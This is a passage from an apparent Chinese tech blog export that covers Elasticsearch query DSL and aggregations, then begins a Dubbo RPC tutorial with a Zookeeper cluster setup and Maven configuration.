&#125;&#125;\n\n\n使用前缀匹配通常针对keyword类型字段（大小写敏感），也就是不分词的字段。前缀搜索效率比较低，并且前缀搜索不会计算相关度分数。前缀越短，效率越低。如果使用前缀搜索，建议使用长前缀。因为前缀搜索需要扫描完整的索引内容，所以前缀越长，相对效率越高。\n\n\nwildcard\n\nES中也有通配符。但是和java还有数据库不太一样。通配符可以在倒排索引中使用，也可以在keyword类型字段中使用。\n// ? 匹配一个任意字符// * 匹配0~n个任意字符GET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;wildcard&quot;: &#123;      &quot;name&quot;: &#123;        &quot;value&quot;: &quot;*d*n*&quot;      &#125;    &#125;  &#125;&#125;\n\n\nregexp\n\n通过正则表达式来匹配数据\nGET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;regexp&quot;: &#123;      &quot;name&quot;: &quot;[A-z].+&quot;    &#125;  &#125;&#125;\n\n\n常用符号：\n[] 表示范围，如： [0-9]是0~9的范围数字\n. 表示一个字符\n+ 表示前面的表达式可以出现多次\n\n\nfuzzy\n\n模糊查询\nGET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;fuzzy&quot;: &#123;      &quot;remark&quot;: &#123;        &quot;value&quot;: &quot;jeva&quot;,        &quot;fuzziness&quot;: 2      &#125;    &#125;  &#125;&#125;\n\n\n搜索的时候，可能搜索条件文本输入错误，如：hello world -&gt; hello word。这种拼写错误还是很常见的。fuzzy技术就是用于解决错误拼写的（在英文中很有效，在中文中几乎无效）。其中fuzziness代表value的值word可以修改多少个字母来进行拼写错误的纠正（修改字母的数量包含字母变更、增加或减少）。\n\n精确匹配\nterm\n\n单个条件相等\n// term查询不会对字段进行分词查询，会采用精确匹配 POST /es_db/_doc/_search&#123;  &quot;query&quot;: &#123;    &quot;term&quot;: &#123;      &quot;name&quot;: &quot;admin&quot;    &#125;  &#125;&#125;\n\n\nterms\n\n单个字段属于某个值数组内的值\nPOST /es_db/_doc/_search&#123;  &quot;query&quot;: &#123;    &quot;terms&quot;: &#123;      &quot;name&quot;: [&quot;admin&quot;,&quot;liduoan&quot;]    &#125;  &#125;&#125;\n\n\nrange\n\n字段属于某个范围内的值\n// 分页、范围、投影、排序POST /es_db/_doc/_search&#123;  &quot;query&quot;: &#123;    &quot;range&quot;: &#123;      &quot;age&quot;: &#123;        &quot;gte&quot;: 25,        &quot;lte&quot;: 28      &#125;    &#125;  &#125;,  &quot;from&quot;: 0,  &quot;size&quot;: 2,  &quot;_source&quot;: [    &quot;name&quot;,    &quot;age&quot;,    &quot;address&quot;  ],  &quot;sort&quot;: &#123;    &quot;age&quot;: &quot;desc&quot;  &#125;&#125;\n\n\nrange：范围关键字\ngte：大于等于\nlte：小于等于\ngt：大于\nlt：小于\nnow：当前时间\n\n1. match\nmatch：模糊匹配，需要指定字段名，但是输入会进行分词，比如”hello world”会进行拆分为hello和world，然后匹配，如果字段中包含hello或者world，或者都包含的结果都会被查询出来，也就是说match是一个部分匹配的模糊查询。查询条件相对来说比较宽松。\n2、term\nterm: 这种查询和match在有些时候是等价的，比如我们查询单个的词hello，那么会和match查询结果一样，但是如果查询”hello world”，结果就相差很大，因为这个输入不会进行分词，就是说查询的时候，是查询字段分词结果中是否有”hello world”的字样，而不是查询字段中包含”hello world”的字样。当保存数据”hello world”时，ES会对字段内容进行分词，”hello world”会被分成hello和world，不存在”hello world”，因此这里的查询结果会为空。这也是term查询和match的区别。\n3. match_phase\nmatch_phase：会对输入做分词，但是需要结果中也包含所有的分词，而且顺序要求一样。以”hello world”为例，要求结果中必须包含hello和world，而且还要求他们是连着的，顺序也是固定的，hello that world不满足，world hello也不满足条件。\n4、query_string\nquery_string：和match类似，但是match需要指定字段名，query_string是在所有字段中搜索，范围更广泛。\n查询与过滤DSL查询语言中存在两种，查询DSL（query DSL）和过滤DSL（filter DSL）。它们两个的区别如下图：\n\nquery DSL在查询上下文中，查询不仅会检查文档是否匹配，还会计算匹配的相关度。\n如何验证匹配很好理解，如何计算相关度呢？ES中索引的数据都会存储一个_score分值，分值越高就代表越匹配。\n另外关于某个搜索的分值计算还是很复杂的，因此也需要一定的时间。\nfilter DSL在过滤器上下文中，只会判断文档是否匹配。答案很简单，是或者不是。它不会去计算任何分值，也不会关心返回的排序问题，因此效率会高一点。过滤上下文是在使用filter参数时候的执行环境。另外，经常使用过滤器，ES会自动的缓存过滤器的内容，这对于查询来说，会提高很多性能。\n组合条件查询组合条件查询是将叶子条件查询语句进行组合而形成的一个完整的查询条件：\n\nbool : 各条件之间有and、or或not的关系\n\nmust : 各个条件都必须满足，即各条件是and的关系\nshould : 各个条件有一个满足即可，即各条件是or的关系\nmust_not : 不满足所有条件，即各条件是not的关系\nfilter : 不计算相关度评分，它不计算_score即相关度评分，效率更高\n\n\n\nGET /test_a/_search&#123;  &quot;query&quot;: &#123;    &quot;bool&quot;: &#123;      &quot;must&quot;: [        &#123;          &quot;match&quot;: &#123;            &quot;f&quot;: &quot;java spark&quot;          &#125;        &#125;      ],      &quot;should&quot;: [        &#123;          &quot;match_phrase&quot;: &#123;            &quot;f&quot;: &#123;              &quot;query&quot;: &quot;java spark&quot;,              &quot;slop&quot;: 50            &#125;          &#125;        &#125;      ]    &#125;  &#125;&#125;\n\nmust&#x2F;filter&#x2F;shoud&#x2F;must_not的子条件是通过term&#x2F;terms&#x2F;range&#x2F;ids&#x2F;exists&#x2F;match叶子条件作为参数的。以上参数，当只有一个搜索条件时，must等对应的是一个对象；当是多个条件时，对应的是一个数组。\n搜索精度控制先看下面一条查询：\nGET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;match&quot;: &#123;      &quot;remark&quot;: &#123;        &quot;query&quot;: &quot;java developer&quot;,        &quot;operator&quot;: &quot;and&quot; // 表示两个词都要包含才能匹配      &#125;    &#125;  &#125;&#125;\n\n上述语法中，如果将operator的值改为or。则与第一个案例搜索语法效果一致。默认的ES执行搜索的时候，operator就是or。\n如果在搜索的结果document中，需要remark字段中包含多个搜索词条中的一定比例，可以使用下述语法实现搜索。其中minimum_should_match可以使用百分比或固定数字。百分比代表query搜索条件中词条百分比，如果无法整除，向下匹配（如query条件有3个单词，如果使用百分比提供精准度计算，那么是无法除尽的，如果需要至少匹配两个单词，则需要用67%来进行描述。如果使用66%描述，ES则认为匹配一个单词即可）。固定数字代表query搜索条件中的词条，至少需要匹配多少个：\nGET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;match&quot;: &#123;      &quot;remark&quot;: &#123;        &quot;query&quot;: &quot;java architect assistant&quot;,        &quot;minimum_should_match&quot;: &quot;68%&quot;      &#125;    &#125;  &#125;&#125;\n\n如果使用should+bool搜索的话，也可以控制搜索条件的匹配度。具体如下\nGET /es_db/_search&#123;  &quot;query&quot;: &#123;    &quot;bool&quot;: &#123;      &quot;should&quot;: [        &#123;          &quot;match&quot;: &#123;            &quot;remark&quot;: &quot;java&quot;          &#125;        &#125;,        &#123;          &quot;match&quot;: &#123;            &quot;remark&quot;: &quot;developer&quot;          &#125;        &#125;,        &#123;          &quot;match&quot;: &#123;            &quot;remark&quot;: &quot;assistant&quot;          &#125;        &#125;      ],      &quot;minimum_should_match&quot;: 2    &#125;  &#125;&#125;\n\n代表搜索的document中的remark字段中，必须匹配java、developer、assistant三个词条中的至少2个。\nDSL聚合聚合的格式如下：\nGET /index_name/type_name/_search&#123;  &quot;aggs&quot;: &#123;    &quot;定义分组名称（最外层）&quot;: &#123;      &quot;分组策略如：terms、avg、sum&quot;: &#123;        &quot;field&quot;: &quot;根据哪一个字段分组&quot;,        &quot;其他参数&quot;: &quot;&quot;      &#125;,      &quot;aggs&quot;: &#123;        &quot;分组名称1&quot;: &#123;&#125;,        &quot;分组名称2&quot;: &#123;&#125;      &#125;    &#125;  &#125;&#125;\n\naggs可以嵌套定义，可以水平定义。嵌套定义称为下钻分析，而水平定义就是平铺多个分组方式。\nBucket与Metric\nbucket就是一个聚合搜索时的数据分组。如：销售部门有员工张三和李四，开发部门有员工王五和赵六。那么根据部门分组聚合得到结果就是两个bucket。销售部门bucket中有张三和李四，开发部门 bucket中有王五和赵六。\nmetric就是对一个bucket数据执行的统计分析。如上述案例中，开发部门有2个员工，销售部门有2个员工，这就是metric。metric有多种统计，如：求和，最大值，最小值，平均值等。\n\n# 用一个大家容易理解的SQL语法来解释select count(*) from table group by column# 那么group by column分组后的每组数据就是bucket，再对每个分组执行的count(*)就是metric。\n\n我们准备一些汽车的数据：\nPUT /cars&#123;  &quot;mappings&quot;: &#123;    &quot;properties&quot;: &#123;      &quot;price&quot;: &#123;        &quot;type&quot;: &quot;long&quot;      &#125;,      &quot;color&quot;: &#123;        &quot;type&quot;: &quot;keyword&quot;      &#125;,      &quot;brand&quot;: &#123;        &quot;type&quot;: &quot;keyword&quot;      &#125;,      &quot;model&quot;: &#123;        &quot;type&quot;: &quot;keyword&quot;      &#125;,      &quot;sold_date&quot;: &#123;        &quot;type&quot;: &quot;date&quot;      &#125;,      &quot;remark&quot;: &#123;        &quot;type&quot;: &quot;text&quot;,        &quot;analyzer&quot;: &quot;ik_max_word&quot;      &#125;    &#125;  &#125;&#125;POST /cars/_bulk&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 258000, &quot;color&quot; : &quot;金色&quot;, &quot;brand&quot;:&quot;大众&quot;, &quot;model&quot; : &quot;大众迈腾&quot;, &quot;sold_date&quot; : &quot;2021-10-28&quot;,&quot;remark&quot; : &quot;大众中档车&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 123000, &quot;color&quot; : &quot;金色&quot;, &quot;brand&quot;:&quot;大众&quot;, &quot;model&quot; : &quot;大众速腾&quot;, &quot;sold_date&quot; : &quot;2021-11-05&quot;,&quot;remark&quot; : &quot;大众神车&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 239800, &quot;color&quot; : &quot;白色&quot;, &quot;brand&quot;:&quot;标志&quot;, &quot;model&quot; : &quot;标志508&quot;, &quot;sold_date&quot; : &quot;2021-05-18&quot;,&quot;remark&quot; : &quot;标志品牌全球上市车型&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 148800, &quot;color&quot; : &quot;白色&quot;, &quot;brand&quot;:&quot;标志&quot;, &quot;model&quot; : &quot;标志408&quot;, &quot;sold_date&quot; : &quot;2021-07-02&quot;,&quot;remark&quot; : &quot;比较大的紧凑型车&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 1998000, &quot;color&quot; : &quot;黑色&quot;, &quot;brand&quot;:&quot;大众&quot;, &quot;model&quot; : &quot;大众辉腾&quot;, &quot;sold_date&quot; : &quot;2021-08-19&quot;,&quot;remark&quot; : &quot;大众最让人肝疼的车&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 218000, &quot;color&quot; : &quot;红色&quot;, &quot;brand&quot;:&quot;奥迪&quot;, &quot;model&quot; : &quot;奥迪A4&quot;, &quot;sold_date&quot; : &quot;2021-11-05&quot;,&quot;remark&quot; : &quot;小资车型&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 489000, &quot;color&quot; : &quot;黑色&quot;, &quot;brand&quot;:&quot;奥迪&quot;, &quot;model&quot; : &quot;奥迪A6&quot;, &quot;sold_date&quot; : &quot;2022-01-01&quot;,&quot;remark&quot; : &quot;政府专用？&quot; &#125;&#123; &quot;index&quot;: &#123;&#125;&#125;&#123; &quot;price&quot; : 1899000, &quot;color&quot; : &quot;黑色&quot;, &quot;brand&quot;:&quot;奥迪&quot;, &quot;model&quot; : &quot;奥迪A 8&quot;, &quot;sold_date&quot; : &quot;2022-02-12&quot;,&quot;remark&quot; : &quot;很贵的大A6。。。&quot; &#125;\n\n简单聚合只执行聚合分组，不做复杂的聚合统计。在ES中最基础的聚合为terms，在ES中默认为分组数据做排序时，使用的是doc_count数据执行降序排列，也就是说包含文档越多的分组排在越前面：\nGET /cars/_search&#123;  &quot;size&quot;: 0,  // size为0表示不返回原数据，只返回聚合结果  &quot;aggs&quot;: &#123;    &quot;group_by_color&quot;: &#123;      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;color&quot;,        &quot;order&quot;: &#123;          &quot;_count&quot;: &quot;desc&quot; // 默认就是根据该值排序        &#125;      &#125;    &#125;  &#125;&#125;\n\n平均值本案例先根据color执行聚合分组，在此分组的基础上，对组内数据执行聚合统计，这个组内数据的聚合统计就是metric：\nGET /cars/_search&#123;  &quot;size&quot;: 0,  &quot;aggs&quot;: &#123;    &quot;group_by_color&quot;: &#123;          // 根据颜色聚合      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;color&quot;,        &quot;order&quot;: &#123;          &quot;avg_by_price&quot;: &quot;asc&quot;  // 根据平均价格排序        &#125;      &#125;,      &quot;aggs&quot;: &#123;        &quot;avg_by_price&quot;: &#123;        // 求出每组的平均价格          &quot;avg&quot;: &#123;            &quot;field&quot;: &quot;price&quot;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n当然还有更复杂的，先根据color聚合分组，在组内根据brand再次聚合分组，最后求出同一个color分组中每个brand分组的平均价格：\nGET /cars/_search&#123;  &quot;size&quot;: 0,  &quot;aggs&quot;: &#123;    &quot;group_by_color&quot;: &#123;   // 根据color分组      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;color&quot;      &#125;,      &quot;aggs&quot;: &#123;        &quot;group_by_brand&quot;: &#123;    // 根据brand分组          &quot;terms&quot;: &#123;            &quot;field&quot;: &quot;brand&quot;,            &quot;order&quot;: &#123;              &quot;avg_by_price&quot;: &quot;desc&quot;            &#125;          &#125;,          &quot;aggs&quot;: &#123;            &quot;avg_by_price&quot;: &#123;    // 最后求brand分组的平均值              &quot;avg&quot;: &#123;                &quot;field&quot;: &quot;price&quot;              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n最大最小与总和求出每个color分组的最高价格、最低价格和总价格：\nGET /cars/_search&#123;  &quot;size&quot;: 0,   &quot;aggs&quot;: &#123;    &quot;group_by_color&quot;: &#123;      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;color&quot;      &#125;,      &quot;aggs&quot;: &#123;        &quot;max_price&quot;: &#123;          &quot;max&quot;: &#123;            &quot;field&quot;: &quot;price&quot;          &#125;        &#125;,        &quot;min_price&quot;: &#123;          &quot;min&quot;: &#123;            &quot;field&quot;: &quot;price&quot;          &#125;        &#125;,        &quot;sum_price&quot;: &#123;          &quot;sum&quot;: &#123;            &quot;field&quot;: &quot;price&quot;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n在常见的业务常见中，聚合分析，最常用的种类就是统计数量、最大、最小、平均、总计等。通常占有聚合业务中的60%以上的比例，小型项目中，甚至占比85%以上。\n排序对聚合统计数据进行排序。如统计每个品牌的汽车销量和销售总额，按照销售总额的降序排列：\nGET /cars/_search&#123;  &quot;size&quot;: 0,   &quot;aggs&quot;: &#123;    &quot;group_of_brand&quot;: &#123;      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;brand&quot;,        &quot;order&quot;: &#123;          &quot;sum_of_price&quot;: &quot;desc&quot;        &#125;      &#125;,      &quot;aggs&quot;: &#123;        &quot;sum_of_price&quot;: &#123;          &quot;sum&quot;: &#123;            &quot;field&quot;: &quot;price&quot;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n如果有多层aggs，执行下钻聚合的时候，也可以根据最内层聚合数据执行排序。如：统计每个品牌中每种颜色车辆的销售总额，并根据销售总额降序排列：\nGET /cars/_search&#123;  &quot;aggs&quot;: &#123;    &quot;group_by_brand&quot;: &#123;      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;brand&quot;      &#125;,      &quot;aggs&quot;: &#123;        &quot;group_by_color&quot;: &#123;          &quot;terms&quot;: &#123;            &quot;field&quot;: &quot;color&quot;,            &quot;order&quot;: &#123;              &quot;sum_of_price&quot;: &quot;desc&quot;            &#125;          &#125;,          &quot;aggs&quot;: &#123;            &quot;sum_of_price&quot;: &#123;              &quot;sum&quot;: &#123;                &quot;field&quot;: &quot;price&quot;              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n但是注意：只能组内数据排序，而不能跨组实现排序。\n排名如果要统计不同brand汽车中价格排名最高的车型该如何做？可以使用top_hits来实现，其中属性如下：\n\nsize代表取组内多少条数据（默认为10）；\nsort代表组内使用什么字段什么规则排序（默认使用_doc的asc规则排序）；\n_source代表结果中包含document中的那些字段（默认包含全部字段）。\n\nGET cars/_search&#123;  &quot;size&quot;: 0,  &quot;aggs&quot;: &#123;    &quot;group_by_brand&quot;: &#123;    // 根据brand分组      &quot;terms&quot;: &#123;        &quot;field&quot;: &quot;brand&quot;      &#125;,      &quot;aggs&quot;: &#123;                   &quot;top_car&quot;: &#123;           // 统计最高价格的车          &quot;top_hits&quot;: &#123;        // 通过top_hits进行统计            &quot;size&quot;: 1,         // 只保留一个，那它就是最高的            &quot;sort&quot;: [          // 根据价格降序              &#123;                &quot;price&quot;: &#123;                  &quot;order&quot;: &quot;desc&quot;                &#125;              &#125;            ],            &quot;_source&quot;: &#123;       // 只保留model和price字段              &quot;includes&quot;: [                &quot;model&quot;,                &quot;price&quot;              ]            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n\n\n","tags":["2021"]},{"title":"Dubbo","url":"/2021/07/02/2021/Dubbo/","content":"\n\nDubbo简介Dubbo是什么？Dubbo是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，并且可以和Spring框架无缝集成。它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。\nDubbo和Spring Cloud有什么区别?了解Spring Cloud的同学都知道，Spring Cloud框架中也具有远程调用(Feign)、容错(Hystrix)和负载均衡(Ribbon)这三个功能，那么Dubbo和Spring Cloud有什么区别呢？\n服务调用方式不同服务调用方式是Spring Cloud和Dubbo的最大不同点。\n\nSpring Cloud的服务调用方式\n在Spring Cloud中，我们通过Feign进行Rest服务调用（也可以使用其他调用方式），Rest风格大家都比较熟悉，它直接把HTTP作为应用协议。\n\nDubbo的服务调用方式\n在Dubbo中使用的是RPC调用，Dubbo采用单一长连接和NIO异步通讯(保持连接&#x2F;轮询处理)，使用自定义报文的TCP协议，并且序列化使用定制Hessian框架。\n\n两者的区别\n基于Http的Rest调用是一种非常灵活的方式，服务间的依赖性低，有利于跨语言的实现以及服务的发布部署。另外，有过开发经验的同学们应该知道，Rest调用的接口是定义在Controller层，适合Swagger接口文档的整合，使得服务文档一体化。\n而RPC本身没有Rest那么灵活，它本身不支持跨语言，除非进行二次封装。并且RPC的实现更为复杂。但是RPC最大的优点就是适合小数据量大并发的服务调用，服务间的调用性能更好。\n使用一个包含10个属性的Pojo对象,请求10万次，Dubbo和Spring Could在不同线程数量下，每次请求耗时(ms)如下表：\n\n\n\n线程数\nDubbo\nSpring Cloud\n\n\n\n10线程\n2.75\n6.52\n\n\n20线程\n4.18\n10.03\n\n\n50线程\n10.3\n28.14\n\n\n100线程\n20.13\n55.23\n\n\n200线程\n42\n110.21\n\n\n\n\n定位不同Dubbo的负责人曾这样说过：\n\n这里就不得不提到目前的一些文章在谈到微服务的时候总是拿Spring Cloud和Dubbo来对比，需要强调的是Dubbo未来的定位并不是要成为一个微服务的全面解决方案，而是专注在RPC领域，成为微服务生态体系中的一个重要组件。至于大家关注的微服务化衍生出的服务治理需求，我们会在Dubbo积极适配开源解决方案，甚至启动独立的开源项目予以支持。\n\n而Spring Cloud则提供了一整套微服务的解决方啊——服务注册与发现、负载均衡与熔断、网关、调用追踪、分布式配置管理等等。相比之下，Dubbo则着重于RPC领域，其他的很多方面需要借助其他技术框架实现。\n打一个不恰当的比方：使用Dubbo构建的微服务架构就像组装电脑，各个环节我们可用自由选择，但木桶效应告诉我们，仅仅一个不恰当的选择可能会大大影响整个架构的性能，但如果你是个高手，这些都不成问题。而Spring Cloud就像品牌机，是经过大量测试组装出来的一台机器，有更高的稳定性，但是如果想要在其中使用非原装的东西，就必须对它有深入的了解。\nDubbo的架构官网上Dubbo的架构图如下所示：\n\n\n节点角色说明\n\n\n\n\n角色\n说明\n\n\n\nProvider\n暴露服务的服务提供方\n\n\nConsumer\n调用远程服务的服务消费方\n\n\nRegistry\n服务注册与发现的注册中心\n\n\nMonitor\n统计服务的调用次数和调用时间的监控中心\n\n\nContainer\n服务运行容器【未在图中标记出\n\n\n其中只有Provider和Consumer是我们需要自己编写的，其余的都由Dubbo帮我们封装好了。\n\n调用关系说明\n\n\n服务容器负责启动，加载，运行服务提供者。\n服务提供者在启动时，向注册中心注册自己提供的服务。\n服务消费者在启动时，向注册中心订阅自己所需的服务。\n注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。（例如通过Zookeeper的监听机制或者Redis的发布订阅机制）\n服务消费者，从提供者地址列表中，基于负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。\n服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。\n\nDubbo负载均衡\nRandom LoadBalance\n随机，按权重设置随机概率。\n在一个截面上碰撞的概率高，但调用量越大分布越均匀，而且按概率使用权重后也比较均匀，有利于动态调整提供者权重。\n\n\nRoundRobin LoadBalance\n轮询，按公约后的权重设置轮询比率。\n存在慢的提供者累积请求的问题，比如：第二台机器很慢，但没挂，当请求调到第二台时就卡在那，久而久之，所有请求都卡在调到第二台上。\n\n\nLeastActive LoadBalance\n最少活跃调用数，相同活跃数的随机，活跃数指调用前后计数差。\n使慢的提供者收到更少请求，因为越慢的提供者的调用前后计数差会越大。\n\n\nConsistentHash LoadBalance\n一致性 Hash，相同参数的请求总是发到同一提供者。\n当某一台提供者挂时，原本发往该提供者的请求，基于虚拟节点，平摊到其它提供者，不会引起剧烈变动。\n算法参见：http://en.wikipedia.org/wiki/Consistent_hashing\n\n\n\nZookeeper搭建注册中心介绍了这么多，下面我们就开始实际操作，来看看Dubbo和Spring Cloud到底有什么不一样。我们先搭建微服务架构中最重要的注册中心，Dubbo可用使用Nacos、Zookeeper等作为注册中心，本文我们用Zookeeper搭建注册中心（Linux环境)。\n准备工作\n确保Linux环境已经安装好JDK\nZookeeper下载地址:https://zookeeper.apache.org/releases.html\n解压压缩包我们搭建一个主从双节点的Zookeeper集群。在&#x2F;user&#x2F;local&#x2F;zookeeper-cluster&#x2F;目录下分别建立zookeeper-1和zookeeper-2两个文件夹，分别将压缩包解压至这俩个文件夹中，并在zookeeper-1和zookeeper-2两个文件夹中再创建一个data文件夹，用于存放数据。\n将zookeeper解压目之&#x2F;conf目录中的zoo_sample.cfg配置文件名称修改为zoo.cfg。\n\n配置集群\n在每个zookeeper的data目录下创建一个myid文件，内容分别是1和2。这个文件就是记录每个服务器的ID。\n修改zookeeper-1的zoo.cfg配置文件如下:\n\n# 端口号clientPort=2181# 数据存储路径dataDir= /usr/local/zookeeper-cluster/zookeeper-1/data# 在文件的最后加上zookeeper集群中两个节点的地址server.1=192.168.74.88:2881:3881server.2=192.168.74.88:2882:3882\n\n\n修改zookeeper-2的zoo.cfg配置文件如下:\n\n# 端口号clientPort=2182# 数据存储路径dataDir= /usr/local/zookeeper-cluster/zookeeper-2/data# 在文件的最后加上zookeeper集群中两个节点的地址server.1=192.168.74.88:2881:3881server.2=192.168.74.88:2882:3882\n\n启动集群\n在每个zookeeper的bin目录下使用如下命令启动\n\n./zkServer.sh start\n\n\n查看状态\n./zkServer.sh status\n\n启动成功后，查看状态后可以看到一个节点的角色为leader（主节点），另一个节点的角色为follower（从节点）。\nZookeeper与Eureka的区别分布式领域有一个重要的的CAP理论，即 Consistency、Availability、Partition tolerance 三个词语的缩写，分别表示一致性、可用性、分区容忍性（详见分布式事务解决方案一文）。针对该理论，Zookeeper保证的是CP，而Eureka的设计遵循AP原则。但是对于服务发现而言，可用性比一致性更为重要。当然Spring Cloud也支持使用Zookeeper作为注册中心，不过不推荐使用。\n微服务开发搭建完了注册中心，我们正式开始微服务的开发。首先，我们看一下入门项目的结构：\n\n父工程中包含接口工程、服务消费者微服务、服务提供者微服务。其中服务消费者和提供者都采用Springboot整合Dubbo进行开发。\nRPC服务接口在服务接口开发中，我们不需要添加任何依赖，只要定义接口即可。\npublic interface HelloSerrvice &#123;    // 同步调用方法    String sayHello(String name);&#125;\n\n其pom文件为：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;parent&gt;        &lt;artifactId&gt;dubbo_liduoan_demo&lt;/artifactId&gt;        &lt;groupId&gt;dubbo_liduoan_demo&lt;/groupId&gt;        &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;/parent&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;artifactId&gt;APIInteface&lt;/artifactId&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;                &lt;configuration&gt;                    &lt;source&gt;1.8&lt;/source&gt;                    &lt;target&gt;1.8&lt;/target&gt;                &lt;/configuration&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;&lt;/project&gt;\n\n服务提供者\n导入依赖\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\txsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\t\t&lt;version&gt;2.0.1.RELEASE&lt;/version&gt;\t\t&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\t&lt;/parent&gt;\t&lt;groupId&gt;com.liduoan&lt;/groupId&gt;\t&lt;artifactId&gt;provider&lt;/artifactId&gt;\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\t&lt;name&gt;provider&lt;/name&gt;\t&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;\t&lt;properties&gt;\t\t&lt;java.version&gt;1.8&lt;/java.version&gt;\t&lt;/properties&gt;\t&lt;dependencies&gt;\t\t&lt;!--dubbo--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.alibaba.spring.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;\t\t\t&lt;version&gt;2.0.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;!--spring-boot-stater--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;\t\t\t&lt;exclusions&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;\t\t\t\t\t&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t&lt;/exclusions&gt;\t\t&lt;/dependency&gt;\t\t&lt;!--zookeeper--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;zookeeper&lt;/artifactId&gt;            &lt;!--注意版本问题--&gt;\t\t\t&lt;version&gt;3.5.8&lt;/version&gt;\t\t\t&lt;exclusions&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\t\t\t\t\t&lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;groupId&gt;log4j&lt;/groupId&gt;\t\t\t\t\t&lt;artifactId&gt;log4j&lt;/artifactId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t&lt;/exclusions&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.101tec&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;zkclient&lt;/artifactId&gt;\t\t\t&lt;version&gt;0.9&lt;/version&gt;\t\t\t&lt;exclusions&gt;\t\t\t\t&lt;exclusion&gt;\t\t\t\t\t&lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\t\t\t\t\t&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\t\t\t\t&lt;/exclusion&gt;\t\t\t&lt;/exclusions&gt;\t\t&lt;/dependency&gt;\t\t&lt;!--API--&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;dubbo_liduoan_demo&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;APIInteface&lt;/artifactId&gt;\t\t\t&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\t\t&lt;/dependency&gt;        